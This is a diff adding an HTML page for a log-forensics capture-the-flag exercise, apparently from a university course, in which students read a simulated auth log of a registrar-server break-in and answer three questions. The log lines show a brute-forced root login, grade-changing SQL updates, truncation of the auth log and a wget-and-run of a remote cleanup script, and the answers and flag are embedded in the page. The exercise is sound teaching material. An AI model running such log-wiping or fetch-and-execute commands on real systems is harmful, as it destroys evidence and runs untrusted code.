@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CTF: The GPA Heist</title>
+  <style>
+    /* basic reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #0f0f0f;
+      color: #cccccc;
+      font-family: monospace;
+      padding: 30px 20px;
+    }
+
+    /* header */
+    .header {
+      max-width: 700px;
+      margin: 0 auto 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .header h1 {
+      font-size: 1.4rem;
+      color: #f0c040;
+    }
+
+    .header p {
+      font-size: 0.7rem;
+      color: #555;
+      margin-top: 4px;
+    }
+
+    .score {
+      text-align: right;
+      font-size: 0.7rem;
+      color: #555;
+    }
+
+    .score span {
+      display: block;
+      font-size: 1.6rem;
+      color: #f0c040;
+    }
+
+    /* story box */
+    .story {
+      max-width: 700px;
+      margin: 0 auto 20px;
+      background: #1a1a1a;
+      border-left: 3px solid #f0c040;
+      padding: 14px 16px;
+      font-size: 0.8rem;
+      line-height: 1.7;
+      color: #aaa;
+    }
+
+    .story strong {
+      color: #f0c040;
+    }
+
+    /* log viewer */
+    .logBox {
+      max-width: 700px;
+      margin: 0 auto 24px;
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+    }
+
+    .logBox .logTitle {
+      background: #111;
+      padding: 8px 14px;
+      font-size: 0.68rem;
+      color: #555;
+      border-bottom: 1px solid #2a2a2a;
+    }
+
+    .logBox .logContent {
+      padding: 10px 14px;
+      font-size: 0.74rem;
+      line-height: 1.9;
+      overflow-x: auto;
+    }
+
+    /* individual log lines */
+    .logLine {
+      display: block;
+      padding: 1px 6px;
+      cursor: pointer;
+      white-space: nowrap;
+      border-left: 2px solid transparent;
+    }
+
+    .logLine:hover {
+      background: #222;
+    }
+
+    .logLine.selected {
+      background: #222;
+      border-left-color: #f0c040;
+    }
+
+    /* color coding log lines */
+    .logLine.normal { color: #555; }
+    .logLine.bad { color: #ff5555; }
+    .logLine.tamper { color: #ff5555; font-weight: bold; }
+
+    .logGap {
+      color: #ff5555;
+      font-size: 0.68rem;
+      padding: 5px 0;
+      text-align: center;
+      opacity: 0.7;
+    }
+
+    /* challenge cards */
+    .challenges {
+      max-width: 700px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .card {
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      padding: 16px 18px;
+    }
+
+    .card.solved {
+      border-color: #50fa7b;
+    }
+
+    .cardTop {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+    }
+
+    .cardTitle {
+      font-size: 1rem;
+      color: #f0c040;
+    }
+
+    /* checkmark when solved */
+    .card.solved .cardTitle::after {
+      content: " ✓";
+      color: #50fa7b;
+    }
+
+    .cardPts {
+      font-size: 0.65rem;
+      color: #555;
+    }
+
+    .cardDesc {
+      font-size: 0.76rem;
+      color: #999;
+      line-height: 1.6;
+      margin-bottom: 12px;
+    }
+
+    /* hint */
+    .hintBtn {
+      font-family: monospace;
+      font-size: 0.65rem;
+      color: #555;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    .hintBtn:hover {
+      color: #f0c040;
+    }
+
+    .hintText {
+      display: none;
+      font-size: 0.72rem;
+      color: #888;
+      background: #111;
+      border-left: 2px solid #333;
+      padding: 8px 12px;
+      margin-bottom: 12px;
+      line-height: 1.6;
+    }
+
+    /* answer input */
+    .answerRow {
+      display: flex;
+      gap: 8px;
+    }
+
+    .answerInput {
+      flex: 1;
+      background: #111;
+      border: 1px solid #2a2a2a;
+      color: #f0c040;
+      font-family: monospace;
+      font-size: 0.76rem;
+      padding: 8px 10px;
+      outline: none;
+    }
+
+    .answerInput:focus {
+      border-color: #f0c040;
+    }
+
+    .answerInput.wrong {
+      border-color: #ff5555;
+      animation: shake 0.3s;
+    }
+
+    .answerInput.correct {
+      border-color: #50fa7b;
+      color: #50fa7b;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-4px); }
+      75% { transform: translateX(4px); }
+    }
+
+    .submitBtn {
+      background: #f0c040;
+      color: #000;
+      border: none;
+      font-family: monospace;
+      font-size: 0.76rem;
+      font-weight: bold;
+      padding: 8px 16px;
+      cursor: pointer;
+    }
+
+    .submitBtn:hover {
+      background: #d4a800;
+    }
+
+    /* flag section */
+    .flagBox {
+      max-width: 700px;
+      margin: 16px auto 0;
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      padding: 16px 18px;
+    }
+
+    .flagLabel {
+      font-size: 0.65rem;
+      color: #555;
+      margin-bottom: 8px;
+      letter-spacing: 1px;
+    }
+
+    .flagLocked {
+      font-size: 0.76rem;
+      color: #555;
+    }
+
+    .flagValue {
+      display: none;
+      font-size: 0.9rem;
+      color: #50fa7b;
+      letter-spacing: 1px;
+    }
+
+    .winMsg {
+      display: none;
+      font-size: 0.74rem;
+      color: #777;
+      margin-top: 8px;
+      line-height: 1.6;
+    }
+
+    /* toast notification */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #1a1a1a;
+      border: 1px solid #f0c040;
+      color: #f0c040;
+      font-family: monospace;
+      font-size: 0.74rem;
+      padding: 10px 14px;
+      opacity: 0;
+      transform: translateY(40px);
+      transition: all 0.25s ease;
+    }
+
+    .toast.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .toast.error {
+      border-color: #ff5555;
+      color: #ff5555;
+    }
+
+    /* progress bar at top */
+    .progressBar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 3px;
+      width: 0%;
+      background: #f0c040;
+      transition: width 0.4s ease;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="progressBar" id="progressBar"></div>
+
+  <!-- header -->
+  <div class="header">
+    <div>
+      <h1>The GPA Heist 🎓</h1>
+      <p>BYU Cyber-266 — Audit Log Manipulation CTF</p>
+    </div>
+    <div class="score">
+      <span id="scoreNum">0</span>
+      / 75 pts
+    </div>
+  </div>
+
+  <!-- story -->
+  <div class="story">
+    <strong>What happened:</strong> Someone broke into the university registrar server and changed their grades.
+    They wiped the auth log to cover their tracks — but not completely.
+    A partial backup was recovered. <strong>Your job is to figure out exactly what they did.</strong>
+  </div>
+
+  <!-- log viewer -->
+  <div class="logBox">
+    <div class="logTitle">/var/log/auth.log — registrar-srv — PARTIAL RECOVERY ⚠</div>
+    <div class="logContent" id="logContent"></div>
+  </div>
+
+  <!-- challenges -->
+  <div class="challenges" id="challenges"></div>
+
+  <!-- flag -->
+  <div class="flagBox">
+    <div class="flagLabel">FLAG</div>
+    <div class="flagLocked" id="flagLocked">Solve all 3 challenges to unlock the flag.</div>
+    <div class="flagValue" id="flagValue">itc266{gr4des_d0nt_l13_but_l0gs_d0}</div>
+    <div class="winMsg" id="winMsg">
+      Case closed. Someone's not getting that 4.0 after all. 💀<br>
+      Submit this flag to complete the challenge.
+    </div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // log lines to display
+    const logLines = [
+      { text: "Mar 03 07:12:01 registrar-srv sshd[1011]: Accepted password for sysadmin from 10.0.1.5 port 51200 ssh2", style: "normal" },
+      { text: "Mar 03 07:14:22 registrar-srv sudo: sysadmin COMMAND=/usr/bin/apt update", style: "normal" },
+      { text: "Mar 03 07:18:33 registrar-srv sshd[1011]: session closed for user sysadmin", style: "normal" },
+      { text: "Mar 03 09:45:13 registrar-srv sshd[2201]: Failed password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:45:14 registrar-srv sshd[2201]: Failed password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:45:15 registrar-srv sshd[2201]: Failed password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:45:16 registrar-srv sshd[2201]: Failed password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:45:17 registrar-srv sshd[2201]: Failed password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:45:18 registrar-srv sshd[2201]: Accepted password for root from 172.16.88.42 port 60001 ssh2", style: "bad" },
+      { text: "Mar 03 09:47:15 registrar-srv sudo: root COMMAND=/usr/bin/mysql -u root -p grades_db", style: "bad" },
+      { text: 'Mar 03 09:52:30 registrar-srv sudo: root COMMAND=/usr/bin/mysql -e "UPDATE students SET gpa=4.0 WHERE student_id=200341"', style: "bad" },
+      { text: "Mar 03 09:54:01 registrar-srv sudo: root COMMAND=/usr/bin/mysql -e \"UPDATE students SET grade='A' WHERE student_id=200341 AND course='CS260'\"", style: "bad" },
+      { text: "Mar 03 10:01:17 registrar-srv sudo: root COMMAND=/usr/bin/truncate -s 0 /var/log/auth.log", style: "tamper" },
+      { gap: true, text: "--- GAP: about 4.5 hours of logs are missing here ---" },
+      { text: "Mar 03 14:30:05 registrar-srv sshd[3301]: Accepted password for sysadmin from 10.0.1.5 port 52100 ssh2", style: "normal" },
+      { text: "Mar 03 14:31:44 registrar-srv sudo: sysadmin COMMAND=/usr/bin/tail -n 50 /var/log/auth.log", style: "normal" },
+      { text: "Mar 03 21:03:44 registrar-srv sshd[4401]: Accepted password for root from 172.16.88.42 port 61500 ssh2", style: "bad" },
+      { text: "Mar 03 21:05:33 registrar-srv sudo: root COMMAND=/usr/bin/wget http://172.16.88.42/cleanup.sh", style: "bad" },
+      { text: "Mar 03 21:05:50 registrar-srv sudo: root COMMAND=/bin/chmod +x cleanup.sh", style: "bad" },
+      { text: "Mar 03 21:05:51 registrar-srv sudo: root COMMAND=/bin/bash cleanup.sh", style: "bad" },
+      { text: "Mar 03 21:08:19 registrar-srv sshd[4401]: session closed for user root", style: "bad" },
+    ];
+
+    // challenge data
+    const challenges = [
+      {
+        id: 1,
+        title: "Who Did It?",
+        desc: "The attacker brute-forced their way into the server. What IP address did they come from?",
+        hint: "Look for repeated Failed password lines happening one second apart. The same IP that kept failing eventually succeeded.",
+        placeholder: "x.x.x.x",
+        answer: "172.16.88.42",
+        pts: 25,
+      },
+      {
+        id: 2,
+        title: "The Actual Crime",
+        desc: "The attacker changed a student's GPA in the database. What was the student ID they targeted?",
+        hint: "Find the MySQL UPDATE command in the log. The student ID is right there in the query after WHERE student_id=",
+        placeholder: "student ID",
+        answer: "200341",
+        pts: 25,
+      },
+      {
+        id: 3,
+        title: "The Coverup",
+        desc: "After changing the grades, the attacker wiped the log to remove evidence. At what time did they do it? (HH:MM:SS)",
+        hint: "Search for the word truncate in the log. That is the command used to zero out a file. Check the timestamp on that line.",
+        placeholder: "HH:MM:SS",
+        answer: "10:01:17",
+        pts: 25,
+      },
+    ];
+
+    // track which challenges are solved
+    let score = 0;
+    let solved = { 1: false, 2: false, 3: false };
+
+    // builds the log viewer
+    function renderLog() {
+      const container = document.getElementById('logContent');
+
+      logLines.forEach(line => {
+        if (line.gap) {
+          const gap = document.createElement('div');
+          gap.className = 'logGap';
+          gap.textContent = line.text;
+          container.appendChild(gap);
+          return;
+        }
+
+        const el = document.createElement('span');
+        el.className = `logLine ${line.style}`;
+        el.textContent = line.text;
+        el.onclick = () => el.classList.toggle('selected');
+        container.appendChild(el);
+      });
+    }
+
+    // builds the challenge cards
+    function renderChallenges() {
+      const container = document.getElementById('challenges');
+
+      challenges.forEach(ch => {
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.id = `card${ch.id}`;
+
+        card.innerHTML = `
+          <div class="cardTop">
+            <div class="cardTitle">Challenge ${ch.id} — ${ch.title}</div>
+            <div class="cardPts">${ch.pts} pts</div>
+          </div>
+          <p class="cardDesc">${ch.desc}</p>
+          <button class="hintBtn" onclick="toggleHint(${ch.id})">▶ show hint</button>
+          <div class="hintText" id="hint${ch.id}">${ch.hint}</div>
+          <div class="answerRow">
+            <input class="answerInput" id="input${ch.id}" placeholder="${ch.placeholder}" />
+            <button class="submitBtn" onclick="checkAnswer(${ch.id})">Submit</button>
+          </div>
+        `;
+
+        container.appendChild(card);
+      });
+    }
+
+    // shows or hides the hint
+    function toggleHint(id) {
+      const hintText = document.getElementById(`hint${id}`);
+      const btn = hintText.previousElementSibling;
+      const isVisible = hintText.style.display === 'block';
+
+      hintText.style.display = isVisible ? 'none' : 'block';
+      btn.textContent = isVisible ? '▶ show hint' : '▼ hide hint';
+    }
+
+    // checks if the answer is correct
+    function checkAnswer(id) {
+      if (solved[id]) return;
+
+      const input = document.getElementById(`input${id}`);
+      const userAnswer = input.value.trim();
+      const correctAnswer = challenges.find(ch => ch.id === id).answer;
+
+      if (userAnswer === correctAnswer) {
+        solved[id] = true;
+        input.classList.add('correct');
+        input.disabled = true;
+        document.getElementById(`card${id}`).classList.add('solved');
+
+        score += 25;
+        document.getElementById('scoreNum').textContent = score;
+        updateProgressBar();
+        showToast('Correct! +25 pts', false);
+
+        if (Object.values(solved).every(Boolean)) {
+          unlockFlag();
+        }
+
+      } else {
+        input.classList.add('wrong');
+        setTimeout(() => input.classList.remove('wrong'), 350);
+        showToast('Not quite — keep looking', true);
+      }
+    }
+
+    // updates the progress bar at the top
+    function updateProgressBar() {
+      const solvedCount = Object.values(solved).filter(Boolean).length;
+      const percent = (solvedCount / challenges.length) * 100;
+      document.getElementById('progressBar').style.width = percent + '%';
+    }
+
+    // shows the flag when all challenges are done
+    function unlockFlag() {
+      document.getElementById('flagLocked').style.display = 'none';
+      document.getElementById('flagValue').style.display = 'block';
+      document.getElementById('winMsg').style.display = 'block';
+      showToast('Flag unlocked! Case closed.', false);
+    }
+
+    // small notification at the bottom right
+    function showToast(message, isError) {
+      const toast = document.getElementById('toast');
+      toast.textContent = message;
+      toast.className = `toast show${isError ? ' error' : ''}`;
+      setTimeout(() => toast.classList.remove('show'), 2500);
+    }
+
+    // run on page load
+    renderLog();
+    renderChallenges();
+  </script>
+</body>
+</html>
